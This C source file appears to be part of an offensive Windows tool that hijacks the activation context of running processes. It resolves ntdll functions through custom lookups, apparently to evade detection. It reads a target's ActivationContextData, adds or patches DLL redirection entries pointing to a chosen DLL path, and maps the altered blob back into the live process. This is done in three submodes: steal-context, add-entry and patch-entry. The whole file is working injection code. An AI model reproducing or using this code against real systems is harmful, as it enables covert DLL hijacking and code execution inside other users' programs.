#include <Windows.h>
#include <stdio.h>

#include "runtime.h"
#include "..\common\dynamic_resolution.h"
#include "..\common\c_runtime.h"
#include "..\common\ntdefs.h"
#include "..\common\actctx.h"
#include "..\common\process_utils.h"

BOOL runtimeStealContext(const char* targetName, const char* dllName, const char* dllPath, const char* stealFrom) {

    // Dynamic module address resolution using custom implementation of GetModuleHandleW
    HMODULE hNtdll = phantom_GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        printf("[ERROR] Couldn't get 'ntdll.dll' handle.\n");
        return FALSE;
    }

    // Dynamic function address resolution using custom implementation of GetProcAddressA    
    fnNtQuerySystemInformation pNtQuerySystemInformation = (fnNtQuerySystemInformation)phantom_GetProcAddressA(hNtdll, "NtQuerySystemInformation");
    fnNtOpenProcess            pNtOpenProcess            = (fnNtOpenProcess)           phantom_GetProcAddressA(hNtdll, "NtOpenProcess");
    fnNtReadVirtualMemory      pNtReadVirtualMemory      = (fnNtReadVirtualMemory)     phantom_GetProcAddressA(hNtdll, "NtReadVirtualMemory");
    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)phantom_GetProcAddressA(hNtdll, "NtQueryInformationProcess");
    fnNtCreateSection          pNtCreateSection          = (fnNtCreateSection)         phantom_GetProcAddressA(hNtdll, "NtCreateSection");
    fnNtMapViewOfSection       pNtMapViewOfSection       = (fnNtMapViewOfSection)      phantom_GetProcAddressA(hNtdll, "NtMapViewOfSection");
    fnNtUnmapViewOfSection     pNtUnmapViewOfSection     = (fnNtUnmapViewOfSection)    phantom_GetProcAddressA(hNtdll, "NtUnmapViewOfSection");

    if (!pNtQuerySystemInformation || !pNtOpenProcess || !pNtReadVirtualMemory ||
        !pNtQueryInformationProcess || !pNtCreateSection || !pNtMapViewOfSection || !pNtUnmapViewOfSection) {
        printf("[ERROR] Dynamic function address resolution failed.\n");
        return FALSE;
    }

    // Get steal process handle specifying the name
    WCHAR* wStealFrom = phantom_char_to_wchar_ascii(stealFrom);
    HANDLE hStealProcess = GetProcessHandleByName(pNtQuerySystemInformation, pNtOpenProcess, wStealFrom, PROCESS_VM_READ | PROCESS_QUERY_INFORMATION);
    free(wStealFrom);

    if (!hStealProcess) return FALSE;

    SIZE_T actCtxSize = 0;
    void* actCtxBlob = CopyRemoteActCtxByHandle(pNtQueryInformationProcess, pNtReadVirtualMemory, hStealProcess, &actCtxSize);
    CloseHandle(hStealProcess);

    if (!actCtxBlob) {
        printf("[ERROR] Failed to copy Activation Context Data blob from steal process.\n");
        return FALSE;
    }
    printf("[INFO] Activation Context blob from '%s'. TotalSize=0x%lX\n", stealFrom, (ULONG)actCtxSize);

    // Reallocate with extra space for patching
    BYTE* blob = (BYTE*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, actCtxBlob, actCtxSize + EXTRA_BYTES + EXTRA_BYTES_ADD);
    if (!blob) {
        printf("[ERROR] HeapReAlloc failed.\n");
        HeapFree(GetProcessHeap(), 0, actCtxBlob);
        return FALSE;
    }

    // Convert dllName and dllPath to WCHAR
    WCHAR* wDllName = phantom_char_to_wchar_ascii(dllName);
    WCHAR* wDllPath = phantom_char_to_wchar_ascii(dllPath);
    if (!wDllName || !wDllPath) {
        printf("[ERROR] Failed to convert dllName/dllPath to WCHAR.\n");
        free(wDllName);
        free(wDllPath);
        HeapFree(GetProcessHeap(), 0, blob);
        return FALSE;
    }

    printf("[INFO] Patching blob: dllName='%s' redirectPath='%s'\n", dllName, dllPath);

    // Patch or add DLL redirection entry
    ULONG newTotalSize = PatchOrAddDllRedirection(blob, (ULONG)actCtxSize, wDllName, wDllPath, 1);
    free(wDllName);
    free(wDllPath);

    if (newTotalSize == (ULONG)actCtxSize) {
        printf("[ERROR] PatchOrAddDllRedirection failed.\n");
        HeapFree(GetProcessHeap(), 0, blob);
        return FALSE;
    }
    printf("[SUCCESS] Blob patched. New TotalSize = 0x%lX\n", newTotalSize);

    // Print patched blob contents
    printf("\n[INFO] Patched ActivationContextData:\n");
    ParseDllRedirections((const BYTE*)blob, newTotalSize);

    // Open the running target process
    WCHAR* wTargetName = phantom_char_to_wchar_ascii(targetName);
    HANDLE hTarget = GetProcessHandleByName(pNtQuerySystemInformation, pNtOpenProcess, wTargetName, PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION);
    free(wTargetName);

    if (!hTarget) {
        HeapFree(GetProcessHeap(), 0, blob);
        return FALSE;
    }

    // Inject patched blob into the running target process
    NTSTATUS status = HijackActCtx(pNtReadVirtualMemory, pNtCreateSection, pNtMapViewOfSection, pNtUnmapViewOfSection, pNtQueryInformationProcess, hTarget, blob, newTotalSize);
    CloseHandle(hTarget);

    if (!NT_SUCCESS(status)) {
        printf("[ERROR] HijackActCtx failed: 0x%08lX\n", status);
        HeapFree(GetProcessHeap(), 0, blob);
        return FALSE;
    }

    printf("[SUCCESS] Activation Context hijacked in running process '%s'.\n", targetName);

    // Cleanup
    HeapFree(GetProcessHeap(), 0, blob);
    return TRUE;
}

BOOL runtimeAddEntry(const char* targetName, const char* dllName, const char* dllPath) {

    // Dynamic module address resolution using custom implementation of GetModuleHandleW
    HMODULE hNtdll = phantom_GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        printf("[ERROR] Couldn't get 'ntdll.dll' handle.\n");
        return FALSE;
    }

    // Dynamic function address resolution using custom implementation of GetProcAddressA
    fnNtQuerySystemInformation  pNtQuerySystemInformation  = (fnNtQuerySystemInformation) phantom_GetProcAddressA(hNtdll, "NtQuerySystemInformation");
    fnNtOpenProcess             pNtOpenProcess             = (fnNtOpenProcess)            phantom_GetProcAddressA(hNtdll, "NtOpenProcess");
    fnNtReadVirtualMemory       pNtReadVirtualMemory       = (fnNtReadVirtualMemory)      phantom_GetProcAddressA(hNtdll, "NtReadVirtualMemory");
    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)phantom_GetProcAddressA(hNtdll, "NtQueryInformationProcess");
    fnNtCreateSection           pNtCreateSection           = (fnNtCreateSection)          phantom_GetProcAddressA(hNtdll, "NtCreateSection");
    fnNtMapViewOfSection        pNtMapViewOfSection        = (fnNtMapViewOfSection)       phantom_GetProcAddressA(hNtdll, "NtMapViewOfSection");
    fnNtUnmapViewOfSection      pNtUnmapViewOfSection      = (fnNtUnmapViewOfSection)     phantom_GetProcAddressA(hNtdll, "NtUnmapViewOfSection");

    if (!pNtQuerySystemInformation || !pNtOpenProcess || !pNtReadVirtualMemory ||
        !pNtQueryInformationProcess || !pNtCreateSection || !pNtMapViewOfSection || !pNtUnmapViewOfSection) {
        printf("[ERROR] Dynamic function address resolution failed.\n");
        return FALSE;
    }

    // Open the running target process
    WCHAR* wTargetName = phantom_char_to_wchar_ascii(targetName);
    HANDLE hTarget = GetProcessHandleByName(pNtQuerySystemInformation, pNtOpenProcess, wTargetName, PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION);
    free(wTargetName);

    if (!hTarget) return FALSE;

    // Copy ActivationContextData blob from the running target process
    SIZE_T actCtxSize = 0;
    void* actCtxBlob = CopyRemoteActCtxByHandle(pNtQueryInformationProcess, pNtReadVirtualMemory, hTarget, &actCtxSize);

    if (!actCtxBlob) {
        printf("[ERROR] Failed to copy Activation Context Data blob from target process.\n");
        CloseHandle(hTarget);
        return FALSE;
    }
    printf("[INFO] Blob copied from target. TotalSize=0x%lX\n", (ULONG)actCtxSize);

    // Reallocate with extra space for the new entry
    BYTE* blob = (BYTE*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, actCtxBlob, actCtxSize + EXTRA_BYTES_ADD);
    if (!blob) {
        printf("[ERROR] HeapReAlloc failed.\n");
        HeapFree(GetProcessHeap(), 0, actCtxBlob);
        CloseHandle(hTarget);
        return FALSE;
    }

    // Convert dllName and dllPath to WCHAR
    WCHAR* wDllName = phantom_char_to_wchar_ascii(dllName);
    WCHAR* wDllPath = phantom_char_to_wchar_ascii(dllPath);
    if (!wDllName || !wDllPath) {
        printf("[ERROR] Failed to convert dllName/dllPath to WCHAR.\n");
        free(wDllName);
        free(wDllPath);
        HeapFree(GetProcessHeap(), 0, blob);
        CloseHandle(hTarget);
        return FALSE;
    }

    // Reject if no DLL redirection section exists in the target blob
    ACTIVATION_CONTEXT_DATA* actx = (ACTIVATION_CONTEXT_DATA*)blob;
    ACTIVATION_CONTEXT_DATA_TOC_HEADER* toc = (ACTIVATION_CONTEXT_DATA_TOC_HEADER*)(blob + actx->DefaultTocOffset);
    ACTIVATION_CONTEXT_DATA_TOC_ENTRY* tocEntries = (ACTIVATION_CONTEXT_DATA_TOC_ENTRY*)(blob + toc->FirstEntryOffset);

    ACTIVATION_CONTEXT_DATA_TOC_ENTRY* dllToc = NULL;
    for (ULONG i = 0; i < toc->EntryCount; i++) {
        if (tocEntries[i].Id == ACTIVATION_CONTEXT_SECTION_DLL_REDIRECTION) {
            dllToc = &tocEntries[i];
            break;
        }
    }

    if (!dllToc) {
        printf("[ERROR] No DLL redirection section (Id==2) found in the target's blob.\n");
        printf("[HINT]  The target has no DLL redirection section.\n");
        printf("        Use 'steal-context' to steal the Activation Context from a process that has one.\n");
        free(wDllName);
        free(wDllPath);
        HeapFree(GetProcessHeap(), 0, blob);
        CloseHandle(hTarget);
        return FALSE;
    }

    // Reject if the entry already exists —> use patch-entry to overwrite an existing redirect
    {
        ACTIVATION_CONTEXT_STRING_SECTION_HEADER* sshdr = (ACTIVATION_CONTEXT_STRING_SECTION_HEADER*)(blob + dllToc->Offset);
        BYTE* B1 = (BYTE*)sshdr;
        ACTIVATION_CONTEXT_STRING_SECTION_ENTRY* strEntries = (ACTIVATION_CONTEXT_STRING_SECTION_ENTRY*)(B1 + sshdr->ElementListOffset);
        ULONG keyByteLen = (ULONG)(wcslen(wDllName) * sizeof(WCHAR));

        for (ULONG i = 0; i < sshdr->ElementCount; i++) {
            if (keyByteLen != strEntries[i].KeyLength) continue;
            const WCHAR* existingKey = (const WCHAR*)(B1 + strEntries[i].KeyOffset);
            ULONG nChars = keyByteLen / sizeof(WCHAR);
            BOOL match = TRUE;
            for (ULONG c = 0; c < nChars; c++) {
                WCHAR a = existingKey[c];
                WCHAR b = wDllName[c];
                if (a >= L'A' && a <= L'Z') a += (L'a' - L'A');
                if (b >= L'A' && b <= L'Z') b += (L'a' - L'A');
                if (a != b) { match = FALSE; break; }
            }
            if (match) {
                printf("[ERROR] '%s' already exists at entry[%lu].\n", dllName, i);
                printf("[HINT]  Use 'patch-entry' to overwrite the existing redirect.\n");
                free(wDllName);
                free(wDllPath);
                HeapFree(GetProcessHeap(), 0, blob);
                CloseHandle(hTarget);
                return FALSE;
            }
        }
    }

    printf("[INFO] Adding entry: dllName='%s' redirectPath='%s'\n", dllName, dllPath);

    // Add new DLL redirection entry
    ULONG newTotalSize = AddDllRedirectionEntry(blob, (ULONG)actCtxSize, wDllName, wDllPath, 1);
    free(wDllName);
    free(wDllPath);

    if (newTotalSize == (ULONG)actCtxSize) {
        printf("[ERROR] AddDllRedirectionEntry failed.\n");
        HeapFree(GetProcessHeap(), 0, blob);
        CloseHandle(hTarget);
        return FALSE;
    }
    printf("[SUCCESS] Entry added. New TotalSize = 0x%lX\n", newTotalSize);

    // Print patched blob contents
    printf("\n[INFO] Patched ActivationContextData:\n");
    ParseDllRedirections((const BYTE*)blob, newTotalSize);

    // Inject patched blob into the running target process
    NTSTATUS status = HijackActCtx(pNtReadVirtualMemory, pNtCreateSection, pNtMapViewOfSection, pNtUnmapViewOfSection, pNtQueryInformationProcess, hTarget, blob, newTotalSize);
    CloseHandle(hTarget);

    if (!NT_SUCCESS(status)) {
        printf("[ERROR] HijackActCtx failed: 0x%08lX\n", status);
        HeapFree(GetProcessHeap(), 0, blob);
        return FALSE;
    }

    printf("[SUCCESS] Activation Context hijacked in running process '%s'.\n", targetName);

    // Cleanup
    HeapFree(GetProcessHeap(), 0, blob);
    return TRUE;
}

BOOL runtimePatchEntry(const char* targetName, const char* dllName, const char* dllPath) {

    // Dynamic module address resolution using custom implementation of GetModuleHandleW
    HMODULE hNtdll = phantom_GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        printf("[ERROR] Couldn't get 'ntdll.dll' handle.\n");
        return FALSE;
    }

    // Dynamic function address resolution using custom implementation of GetProcAddressA
    fnNtQuerySystemInformation  pNtQuerySystemInformation  = (fnNtQuerySystemInformation) phantom_GetProcAddressA(hNtdll, "NtQuerySystemInformation");
    fnNtOpenProcess             pNtOpenProcess             = (fnNtOpenProcess)            phantom_GetProcAddressA(hNtdll, "NtOpenProcess");
    fnNtReadVirtualMemory       pNtReadVirtualMemory       = (fnNtReadVirtualMemory)      phantom_GetProcAddressA(hNtdll, "NtReadVirtualMemory");
    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)phantom_GetProcAddressA(hNtdll, "NtQueryInformationProcess");
    fnNtCreateSection           pNtCreateSection           = (fnNtCreateSection)          phantom_GetProcAddressA(hNtdll, "NtCreateSection");
    fnNtMapViewOfSection        pNtMapViewOfSection        = (fnNtMapViewOfSection)       phantom_GetProcAddressA(hNtdll, "NtMapViewOfSection");
    fnNtUnmapViewOfSection      pNtUnmapViewOfSection      = (fnNtUnmapViewOfSection)     phantom_GetProcAddressA(hNtdll, "NtUnmapViewOfSection");

    if (!pNtQuerySystemInformation || !pNtOpenProcess || !pNtReadVirtualMemory ||
        !pNtQueryInformationProcess || !pNtCreateSection || !pNtMapViewOfSection || !pNtUnmapViewOfSection) {
        printf("[ERROR] Dynamic function address resolution failed.\n");
        return FALSE;
    }

    // Open the running target process
    WCHAR* wTargetName = phantom_char_to_wchar_ascii(targetName);
    HANDLE hTarget = GetProcessHandleByName(pNtQuerySystemInformation, pNtOpenProcess, wTargetName, PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION);
    free(wTargetName);

    if (!hTarget) return FALSE;

    // Copy ActivationContextData blob from the running target process
    SIZE_T actCtxSize = 0;
    void* actCtxBlob = CopyRemoteActCtxByHandle(pNtQueryInformationProcess, pNtReadVirtualMemory, hTarget, &actCtxSize);

    if (!actCtxBlob) {
        printf("[ERROR] Failed to copy Activation Context Data blob from target process.\n");
        CloseHandle(hTarget);
        return FALSE;
    }
    printf("[INFO] Blob copied from target. TotalSize=0x%lX\n", (ULONG)actCtxSize);

    // Reallocate with extra space for patching
    BYTE* blob = (BYTE*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, actCtxBlob, actCtxSize + EXTRA_BYTES);
    if (!blob) {
        printf("[ERROR] HeapReAlloc failed.\n");
        HeapFree(GetProcessHeap(), 0, actCtxBlob);
        CloseHandle(hTarget);
        return FALSE;
    }

    // Convert dllName and dllPath to WCHAR
    WCHAR* wDllName = phantom_char_to_wchar_ascii(dllName);
    WCHAR* wDllPath = phantom_char_to_wchar_ascii(dllPath);
    if (!wDllName || !wDllPath) {
        printf("[ERROR] Failed to convert dllName/dllPath to WCHAR.\n");
        free(wDllName);
        free(wDllPath);
        HeapFree(GetProcessHeap(), 0, blob);
        CloseHandle(hTarget);
        return FALSE;
    }

    // Locate the DLL redirection section
    ACTIVATION_CONTEXT_DATA* actx = (ACTIVATION_CONTEXT_DATA*)blob;
    ACTIVATION_CONTEXT_DATA_TOC_HEADER* toc = (ACTIVATION_CONTEXT_DATA_TOC_HEADER*)(blob + actx->DefaultTocOffset);
    ACTIVATION_CONTEXT_DATA_TOC_ENTRY* tocEntries = (ACTIVATION_CONTEXT_DATA_TOC_ENTRY*)(blob + toc->FirstEntryOffset);

    ACTIVATION_CONTEXT_DATA_TOC_ENTRY* dllToc = NULL;
    for (ULONG i = 0; i < toc->EntryCount; i++) {
        if (tocEntries[i].Id == ACTIVATION_CONTEXT_SECTION_DLL_REDIRECTION) {
            dllToc = &tocEntries[i];
            break;
        }
    }

    if (!dllToc) {
        printf("[ERROR] No DLL redirection section (Id==2) found in the target's blob.\n");
        printf("[HINT]  The target has no SxS DLL redirection manifest.\n");
        printf("        Use 'steal-context' to steal the entire Activation Context from a process that has one.\n");
        free(wDllName);
        free(wDllPath);
        HeapFree(GetProcessHeap(), 0, blob);
        CloseHandle(hTarget);
        return FALSE;
    }

    // Search for the target entry by case-insensitive name
    ACTIVATION_CONTEXT_STRING_SECTION_HEADER* sshdr = (ACTIVATION_CONTEXT_STRING_SECTION_HEADER*)(blob + dllToc->Offset);
    BYTE* B1 = (BYTE*)sshdr;
    ACTIVATION_CONTEXT_STRING_SECTION_ENTRY* strEntries = (ACTIVATION_CONTEXT_STRING_SECTION_ENTRY*)(B1 + sshdr->ElementListOffset);

    ULONG keyByteLen = (ULONG)(wcslen(wDllName) * sizeof(WCHAR));
    LONG foundIdx = -1;
    for (ULONG i = 0; i < sshdr->ElementCount; i++) {
        if (keyByteLen != strEntries[i].KeyLength) continue;
        const WCHAR* existingKey = (const WCHAR*)(B1 + strEntries[i].KeyOffset);
        ULONG nChars = keyByteLen / sizeof(WCHAR);
        BOOL match = TRUE;
        for (ULONG c = 0; c < nChars; c++) {
            WCHAR a = existingKey[c];
            WCHAR b = wDllName[c];
            if (a >= L'A' && a <= L'Z') a += (L'a' - L'A');
            if (b >= L'A' && b <= L'Z') b += (L'a' - L'A');
            if (a != b) { match = FALSE; break; }
        }
        if (match) { foundIdx = (LONG)i; break; }
    }

    free(wDllName);

    if (foundIdx < 0) {
        printf("[ERROR] '%s' not found in DLL redirection section.\n", dllName);
        printf("[HINT]  No existing redirect for this DLL. Use 'add-entry' to create one.\n");
        free(wDllPath);
        HeapFree(GetProcessHeap(), 0, blob);
        CloseHandle(hTarget);
        return FALSE;
    }

    printf("[INFO] Patching entry[%ld]: dllName='%s' redirectPath='%s'\n", foundIdx, dllName, dllPath);

    // Patch the existing entry
    ULONG newTotalSize = PatchDllRedirectionEntry(blob, (ULONG)actCtxSize, (ULONG)foundIdx, wDllPath);
    free(wDllPath);

    if (newTotalSize == (ULONG)actCtxSize) {
        printf("[ERROR] PatchDllRedirectionEntry failed.\n");
        HeapFree(GetProcessHeap(), 0, blob);
        CloseHandle(hTarget);
        return FALSE;
    }
    printf("[SUCCESS] Entry patched. New TotalSize = 0x%lX\n", newTotalSize);

    // Print patched blob contents
    printf("\n[INFO] Patched ActivationContextData:\n");
    ParseDllRedirections((const BYTE*)blob, newTotalSize);

    // Inject patched blob into the running target process
    NTSTATUS status = HijackActCtx(pNtReadVirtualMemory, pNtCreateSection, pNtMapViewOfSection, pNtUnmapViewOfSection, pNtQueryInformationProcess, hTarget, blob, newTotalSize);
    CloseHandle(hTarget);

    if (!NT_SUCCESS(status)) {
        printf("[ERROR] HijackActCtx failed: 0x%08lX\n", status);
        HeapFree(GetProcessHeap(), 0, blob);
        return FALSE;
    }

    printf("[SUCCESS] Activation Context hijacked in running process '%s'.\n", targetName);

    // Cleanup
    HeapFree(GetProcessHeap(), 0, blob);
    return TRUE;
}

BOOL modeRuntime(const char* submode, const char* targetName, const char* dllName, const char* dllPath, const char* stealFrom) {
    if (strcmp(submode, "steal-context") == 0) {
        if (!runtimeStealContext(targetName, dllName, dllPath, stealFrom)) return FALSE;
        return TRUE;
    } else if (strcmp(submode, "add-entry") == 0) {
        if (!runtimeAddEntry(targetName, dllName, dllPath)) return FALSE;
        return TRUE;
    } else if (strcmp(submode, "patch-entry") == 0) {
        if (!runtimePatchEntry(targetName, dllName, dllPath)) return FALSE;
        return TRUE;
    }
    return FALSE;
}
